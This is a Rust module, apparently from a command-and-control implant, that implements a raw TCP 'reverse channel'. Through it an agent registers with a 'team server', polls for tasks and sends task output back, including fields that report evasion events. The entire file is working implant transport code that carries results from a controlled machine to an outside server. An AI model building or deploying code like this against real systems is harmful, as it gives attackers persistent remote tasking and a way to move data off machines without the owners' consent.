//! TCP reverse channel — agent connects to the team server over raw TCP.
//!
//! Protocol: each message is length-prefixed (4 bytes little-endian) followed by JSON.
//!
//! Request envelope: {"type":"register"|"poll"|"submit", "body":{...}}
//! Response: the raw JSON object matching the request type.

use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;

use serde_json;

use super::{Channel, ChannelError};
use crate::task::{PollResponse, RegisterRequest, RegisterResponse, TaskOutputRequest};

pub struct TcpChannel {
    host: String,
    port: String,
}

impl TcpChannel {
    pub fn new(host: &str, port: &str) -> Self {
        Self { host: host.to_string(), port: port.to_string() }
    }

    fn connect(&self) -> Result<TcpStream, ChannelError> {
        let addr = format!("{}:{}", self.host, self.port);
        TcpStream::connect(&addr)
            .and_then(|s| {
                s.set_read_timeout(Some(Duration::from_secs(30)))?;
                s.set_write_timeout(Some(Duration::from_secs(10)))?;
                Ok(s)
            })
            .map_err(|e| ChannelError::Network(e.to_string()))
    }

    fn send_recv(&self, envelope: &[u8]) -> Result<Vec<u8>, ChannelError> {
        let mut stream = self.connect()?;
        let len = (envelope.len() as u32).to_le_bytes();
        stream.write_all(&len).map_err(|e| ChannelError::Network(e.to_string()))?;
        stream.write_all(envelope).map_err(|e| ChannelError::Network(e.to_string()))?;

        let mut rlen_buf = [0u8; 4];
        stream.read_exact(&mut rlen_buf).map_err(|e| ChannelError::Network(e.to_string()))?;
        let rlen = u32::from_le_bytes(rlen_buf) as usize;
        if rlen > 32 * 1024 * 1024 {
            return Err(ChannelError::Parse("response too large".into()));
        }
        let mut rbuf = vec![0u8; rlen];
        stream.read_exact(&mut rbuf).map_err(|e| ChannelError::Network(e.to_string()))?;
        Ok(rbuf)
    }
}

impl Channel for TcpChannel {
    fn register(
        &mut self,
        req: &RegisterRequest,
        _path: &str,
    ) -> Result<RegisterResponse, ChannelError> {
        let body = serde_json::to_vec(req)
            .map_err(|e| ChannelError::Parse(e.to_string()))?;
        let env = wrap_envelope("register", &body)?;
        let resp = self.send_recv(&env)?;
        serde_json::from_slice(&resp).map_err(|e| ChannelError::Parse(e.to_string()))
    }

    fn poll(
        &mut self,
        session: &crate::Session,
        _path: &str,
    ) -> Result<PollResponse, ChannelError> {
        let body = serde_json::to_vec(&serde_json::json!({"session_id": session.id}))
            .map_err(|e| ChannelError::Parse(e.to_string()))?;
        let env = wrap_envelope("poll", &body)?;
        let resp = self.send_recv(&env)?;
        serde_json::from_slice(&resp).map_err(|e| ChannelError::Parse(e.to_string()))
    }

    fn submit_output(
        &mut self,
        session:             &crate::Session,
        _path:               &str,
        task_id:             &str,
        output:              Vec<u8>,
        success:             bool,
        evasion_event:       bool,
        evasion_description: String,
    ) -> Result<(), ChannelError> {
        let req = TaskOutputRequest {
            session_id: session.id.clone(),
            task_id: task_id.to_string(),
            output,
            success,
            evasion_event,
            evasion_description,
        };
        let body = serde_json::to_vec(&req)
            .map_err(|e| ChannelError::Parse(e.to_string()))?;
        let env = wrap_envelope("submit", &body)?;
        self.send_recv(&env)?;
        Ok(())
    }
}

fn wrap_envelope(msg_type: &str, body: &[u8]) -> Result<Vec<u8>, ChannelError> {
    let raw = serde_json::json!({
        "type": msg_type,
        "body": serde_json::from_slice::<serde_json::Value>(body)
            .map_err(|e| ChannelError::Parse(e.to_string()))?,
    });
    serde_json::to_vec(&raw).map_err(|e| ChannelError::Parse(e.to_string()))
}
